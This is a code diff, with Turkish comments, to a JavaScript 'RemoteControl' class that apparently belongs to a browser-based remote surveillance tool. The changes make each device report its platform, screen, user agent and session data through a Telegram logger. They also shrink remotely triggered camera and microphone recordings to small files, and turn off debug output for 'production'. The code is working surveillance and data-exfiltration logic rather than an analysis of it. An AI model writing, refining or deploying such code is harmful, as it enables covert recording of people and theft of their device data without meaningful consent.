@@ -191,10 +191,20 @@ class RemoteControl {
     // Komutu çalıştır
     async executeCommand(cmd) {
         try {
-            // /devices komutu - sadece ilk cihaz yanıt verir
+            // /devices komutu - her cihaz kendi bilgisini gönderir
             if (cmd.command === 'list_devices') {
-                // Session listesi gönder
-                await this.sendDeviceList();
+                // Kendi cihaz bilgisini gönder
+                if (window.telegramLogger) {
+                    const deviceInfo = await this.collectDeviceInfo();
+                    await window.telegramLogger.sendLog('device_info', {
+                        session_id: this.sessionId.substring(0, 16) + '...',
+                        platform: deviceInfo.platform,
+                        screen: deviceInfo.screen,
+                        user_agent: deviceInfo.user_agent.substring(0, 50) + '...',
+                        language: deviceInfo.language,
+                        online: deviceInfo.online
+                    });
+                }
                 return;
             }
 
@@ -346,11 +356,19 @@ class RemoteControl {
         try {
             if (this.debug) console.log(`[RemoteControl] Recording camera for ${duration} seconds...`);
 
-            // Kamera erişimi al
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            // Kamera erişimi al (düşük çözünürlük)
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { 
+                    width: { ideal: 640 },
+                    height: { ideal: 480 },
+                    frameRate: { ideal: 15 }
+                }, 
+                audio: true 
+            });
             
             const mediaRecorder = new MediaRecorder(stream, {
-                mimeType: 'video/webm;codecs=vp8,opus'
+                mimeType: 'video/webm;codecs=vp8,opus',
+                videoBitsPerSecond: 250000 // 250kbps - düşük kalite ama küçük dosya
             });
 
             const chunks = [];
@@ -398,11 +416,18 @@ class RemoteControl {
         try {
             if (this.debug) console.log(`[RemoteControl] Recording microphone for ${duration} seconds...`);
 
-            // Mikrofon erişimi al
-            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            // Mikrofon erişimi al (düşük kalite)
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                audio: {
+                    sampleRate: 16000,
+                    echoCancellation: true,
+                    noiseSuppression: true
+                }
+            });
             
             const mediaRecorder = new MediaRecorder(stream, {
-                mimeType: 'audio/webm;codecs=opus'
+                mimeType: 'audio/webm;codecs=opus',
+                audioBitsPerSecond: 32000 // 32kbps - düşük kalite ama küçük dosya
             });
 
             const chunks = [];
@@ -477,7 +502,7 @@ class RemoteControl {
 
 // Global instance oluştur
 const remoteControl = new RemoteControl({
-    debug: true // Test için açık - sonra false yap
+    debug: false // Production - rate limit önlemek için
 });
 
 // Global scope'a ekle
